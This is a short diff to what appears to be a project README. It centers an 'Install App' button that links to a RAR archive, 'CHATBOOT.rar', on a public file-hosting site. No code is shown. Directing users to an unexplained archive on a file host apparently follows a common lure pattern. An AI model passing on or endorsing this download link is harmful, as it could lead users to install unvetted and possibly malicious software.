@@ -43,8 +43,9 @@
 
 ## 💻📂ㅤInstall Appㅤ📂💻
 
-<a href="https://www.mediafire.com/file/2s7tb12cvdy0dkd/CHATBOOT.rar/file">
+<p align="center">
+  <a href="https://www.mediafire.com/file/2s7tb12cvdy0dkd/CHATBOOT.rar/file">
     <img width="250" height="55" src="https://i.imgur.com/pGOoFea.png">
   </a>
-
+</p>
 
